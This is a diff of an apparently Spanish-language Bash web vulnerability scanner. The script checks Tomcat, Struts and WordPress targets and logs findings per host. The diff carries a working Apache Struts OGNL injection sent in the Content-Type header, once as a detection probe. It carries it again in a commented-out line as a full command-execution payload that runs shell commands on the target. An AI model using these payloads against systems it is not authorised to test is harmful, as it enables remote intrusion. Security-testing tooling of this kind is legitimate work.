@@ -694,10 +694,9 @@ function enumeracionTomcat() {
         echo $command >> logs/vulnerabilidades/"$host"_"$port-$path_web_sin_slash"_CGIServlet.txt
         eval $command >> logs/vulnerabilidades/"$host"_"$port-$path_web_sin_slash"_CGIServlet.txt &
 
-        command="$proxychains curl -k --max-time 10 -H 'Content-Type: %{(#test='multipart/form-data').(#dm=@ognl.OgnlContext@DEFAULT_MEMBER_ACCESS).(#_memberAccess?(#_memberAccess=#dm):((#container=#context['com.opensymphony.xwork2.ActionContext.container']).(#ognlUtil=#container.getInstance(@com.opensymphony.xwork2.ognl.OgnlUtil@class)).(#ognlUtil.getExcludedPackageNames().clear()).(#ognlUtil.getExcludedClasses().clear()).(#context.setMemberAccess(#dm)))).(#ros=(@org.apache.struts2.ServletActionContext@getResponse().getOutputStream())).(#ros.println('Apache Struts Vulnerable $proto_http://$host:$port')).(#ros.flush())}' '$proto_http://$host:$port/'"
-        echo $command >> logs/vulnerabilidades/"$host"_"$port-$path_web_sin_slash"_apacheStruts.txt
-        eval $command >> logs/vulnerabilidades/"$host"_"$port-$path_web_sin_slash"_apacheStruts.txt 2>/dev/null &
+    	curl -k --max-time 10 -H "Content-Type: %{(#test='multipart/form-data').(#dm=@ognl.OgnlContext@DEFAULT_MEMBER_ACCESS).(#_memberAccess?(#_memberAccess=#dm):((#container=#context['com.opensymphony.xwork2.ActionContext.container']).(#ognlUtil=#container.getInstance(@com.opensymphony.xwork2.ognl.OgnlUtil@class)).(#ognlUtil.getExcludedPackageNames().clear()).(#ognlUtil.getExcludedClasses().clear()).(#context.setMemberAccess(#dm)))).(#ros=(@org.apache.struts2.ServletActionContext@getResponse().getOutputStream())).(#ros.println('Apache Struts Vulnerable $proto_http://$host:$port')).(#ros.flush())}" "$proto_http://$host:$port/" >> logs/vulnerabilidades/"$host"_"$port-$path_web_sin_slash"_apacheStruts.txt 2>/dev/null&
 
+		# curl -i -s -k  -X $'GET' -H $'User-Agent: Mozilla/5.0' -H $'Content-Type: %{(#_=\'multipart/form-data\').(#dm=@ognl.OgnlContext@DEFAULT_MEMBER_ACCESS).(#_memberAccess?(#_memberAccess=#dm):((#container=#context[\'com.opensymphony.xwork2.ActionContext.container\']).(#ognlUtil=#container.getInstance(@com.opensymphony.xwork2.ognl.OgnlUtil@class)).(#ognlUtil.getExcludedPackageNames().clear()).(#ognlUtil.getExcludedClasses().clear()).(#context.setMemberAccess(#dm)))).(#cmd=\'ls -lat /\').(#iswin=(@java.lang.System@getProperty(\'os.name\').toLowerCase().contains(\'win\'))).(#cmds=(#iswin?{\'cmd.exe\',\'/c\',#cmd}:{\'/bin/bash\',\'-c\',#cmd})).(#p=new java.lang.ProcessBuilder(#cmds)).(#p.redirectErrorStream(true)).(#process=#p.start()).(#ros=(@org.apache.struts2.ServletActionContext@getResponse().getOutputStream())).(@org.apache.commons.io.IOUtils@copy(#process.getInputStream(),#ros)).(#ros.flush())}' $'https://target'
         waitWeb 0.3
         echo -e "\t\t[+] Revisando archivos genericos ($host - Tomcat)"
         command="web-buster -target $host -port $port -proto $proto_http -path $path_web -module files -threads $hilos_web -redirects 0 -show404 $param_msg_error"
@@ -863,6 +862,9 @@ function enumeracionCMS () {
 		greprc=$?
 		if [[ $greprc -eq 0 ]];then
 			echo -e "\t\t[+] Revisando vulnerabilidades de Wordpress ($host)"
+
+			checkerWeb.py --tipo registro --url "$proto_http://$host:$port/" > logs/vulnerabilidades/"$host"_"$port-$path_web_sin_slash"_cms-registroHabilitado.txt
+
 			wordpress-scan -url $proto_http"://"$host":"$port/ > logs/vulnerabilidades/"$host"_"$port-$path_web_sin_slash"_wordpressPlugins.txt &
 			xml-rpc-test -url $proto_http"://"$host":"$port > logs/vulnerabilidades/"$host"_"$port-$path_web_sin_slash"_xml-rpc-habilitado.txt &
 			xml-rpc-login -url $proto_http"://"$host":"$port > logs/vulnerabilidades/"$host"_"$port-$path_web_sin_slash"_xml-rpc-login.txt &
@@ -998,7 +1000,6 @@ function enumeracionCMS () {
 
 			echo -e "\t\t[+] Revisando si el registro esta habilitado"
 			checkerWeb.py --tipo registro --url "$proto_http://$host:$port/" > logs/vulnerabilidades/"$host"_"$port-$path_web_sin_slash"_cms-registroHabilitado.txt
-			grep 200 logs/vulnerabilidades/"$host"_"$port-$path_web_sin_slash"_cms-registroHabilitado.txt > .vulnerabilidades/"$host"_"$port-$path_web_sin_slash"_cms-registroHabilitado.txt
 		fi
 		###################################
 
@@ -1799,8 +1800,9 @@ if [[ $webScaneado -eq 1 ]]; then
 			[ ! -e ".vulnerabilidades2/${host}_${port}-${path_web_sin_slash}_archivosPeligrosos.txt" ] && egrep --color=never "^200" logs/vulnerabilidades/"$host"_"$port-$path_web_sin_slash"_archivosPeligrosos.txt >> .vulnerabilidades/"$host"_"$port-$path_web_sin_slash"_archivosPeligrosos.txt 2>/dev/null
 			[ ! -e ".vulnerabilidades2/${host}_${port}-${path_web_sin_slash}_openWebservice.txt" ] && egrep --color=never "^200" logs/vulnerabilidades/"$host"_"$port-$path_web_sin_slash"_openWebservice.txt >> .vulnerabilidades/"$host"_"$port-$path_web_sin_slash"_openWebservice.txt 2>/dev/null
 			[ ! -e ".vulnerabilidades2/${host}_${port}-${path_web_sin_slash}_webshell.txt" ] && egrep --color=never "^200" logs/vulnerabilidades/"$host"_"$port-$path_web_sin_slash"_webshell.txt >> .vulnerabilidades/"$host"_"$port-$path_web_sin_slash"_webshell.txt 2>/dev/null
-			[ ! -e ".vulnerabilidades2/${host}_${port}-${path_web_sin_slash}_divulgacionInformacion.txt" ] && egrep --color=never "^200" logs/vulnerabilidades/"$host"_"$port-$path_web_sin_slash"_divulgacionInformacion.txt > .vulnerabilidades/"$host"_"$port-$path_web_sin_slash"_divulgacionInformacion.txt 2>/dev/null
+			[ ! -e ".vulnerabilidades2/${host}_${port}-${path_web_sin_slash}_divulgacionInformacion.txt" ] && egrep --color=never "^200" logs/vulnerabilidades/"$host"_"$port-$path_web_sin_slash"_divulgacionInformacion.txt > .enumeracion/"$host"_"$port-$path_web_sin_slash"_divulgacionInformacion.txt 2>/dev/null
 			[ ! -e ".vulnerabilidades2/${host}_${port}-${path_web_sin_slash}_phpinfo.txt" ] && egrep --color=never "^200" logs/vulnerabilidades/"$host"_"$port-$path_web_sin_slash"_phpinfo.txt > .vulnerabilidades/"$host"_"$port-$path_web_sin_slash"_phpinfo.txt 2>/dev/null
+			[ ! -e ".vulnerabilidades2/${host}_${port}-${path_web_sin_slash}_cms-registroHabilitado.txt" ] && egrep --color=never "^200" logs/vulnerabilidades/"$host"_"$port-$path_web_sin_slash"_cms-registroHabilitado.txt > .vulnerabilidades/"$host"_"$port-$path_web_sin_slash"_cms-registroHabilitado.txt
 			 
 			[ ! -e ".vulnerabilidades2/${host}_${port}-${path_web_sin_slash}_HTTPsys.txt" ] && grep --color=never "|" logs/vulnerabilidades/"$host"_"$port-$path_web_sin_slash"_HTTPsys.txt 2>/dev/null | egrep -iv "ACCESS_DENIED|false|Could|ERROR|NOT_FOUND|DISABLED|filtered|Failed|TIMEOUT|NT_STATUS_INVALID_NETWORK_RESPONSE|NT_STATUS_UNKNOWN|http-server-header|did not respond with any data|http-server-header" > .vulnerabilidades/"$host"_"$port-$path_web_sin_slash"_HTTPsys.txt
 			[ ! -e ".vulnerabilidades2/${host}_${port}-${path_web_sin_slash}_IISwebdavVulnerable.txt" ] && grep --color=never "|" logs/vulnerabilidades/"$host"_"$port-$path_web_sin_slash"_IISwebdavVulnerable.txt 2>/dev/null | egrep -iv "ACCESS_DENIED|false|Could|ERROR|NOT_FOUND|DISABLED|filtered|Failed|TIMEOUT|NT_STATUS_INVALID_NETWORK_RESPONSE|NT_STATUS_UNKNOWN|http-server-header|did not respond with any data|http-server-header" > .vulnerabilidades/"$host"_"$port-$path_web_sin_slash"_IISwebdavVulnerable.txt
@@ -2254,7 +2256,6 @@ if [[ $webScaneado -eq 1 ]]; then
 		archivo_destino=${archivo_destino/admin/$vulnerabilidad}
 		archivo_destino=${archivo_destino/webData/$vulnerabilidad}
 		archivo_destino=${archivo_destino/custom/$vulnerabilidad}
-		archivo_destino=${archivo_destino/phpinfo/phpinfo2}
 
 
 		if [ $vulnerabilidad == 'backdoor' ];then
@@ -2264,7 +2265,8 @@ if [[ $webScaneado -eq 1 ]]; then
 
 		if [ $vulnerabilidad == 'PasswordDetected' ];then
 			if [ "$VERBOSE" == '1' ]; then  echo -e "[+] PasswordDetected en $url_vulnerabilidad"  ; fi
-			contenido=$url_vulnerabilidad
+			contenido=`getExtract -url $url_vulnerabilidad`
+
 		fi
 
 		if [ $vulnerabilidad == 'ListadoDirectorios' ];then
@@ -2291,8 +2293,11 @@ if [[ $webScaneado -eq 1 ]]; then
 
 		if [ $vulnerabilidad == 'MensajeError' ];then
 			if [ "$VERBOSE" == '1' ]; then  echo -e "[+] MensajeError \n"  ; fi
-			contenido="$url_vulnerabilidad\n"`curl --max-time 10 -k  $url_vulnerabilidad | grep -v "langconfig" | egrep "undefined function|Fatal error|Uncaught exception|No such file or directory|Lost connection to MySQL|mysql_select_db|ERROR DE CONSULTA|no se pudo conectar al servidor|Fatal error:|Uncaught Error:|Stack trace|Exception information" -m1 -b10 -A10`
+			contenido="$url_vulnerabilidad" 
+			#`curl --max-time 10 -k  $url_vulnerabilidad | grep -v "langconfig" | egrep "undefined function|Fatal error|Uncaught exception|No such file or directory|Lost connection to MySQL|mysql_select_db|ERROR DE CONSULTA|no se pudo conectar al servidor|Fatal error:|Uncaught Error:|Stack trace|Exception information" -m1 -b10 -A10`
 		fi
+
+		
 
 		if [[ $vulnerabilidad == 'phpinfo' ]];then
 			if [ "$VERBOSE" == '1' ]; then echo -e "[+] Posible archivo PhpInfo ($url_vulnerabilidad)"   ; fi
@@ -2319,7 +2324,7 @@ if [[ $webScaneado -eq 1 ]]; then
 		fi
 
 		echo "archivo_destino $archivo_destino"
-		echo $contenido >> $archivo_destino
+		echo -e $contenido >> $archivo_destino
 	done
 	# insertar datos
 	insert_data
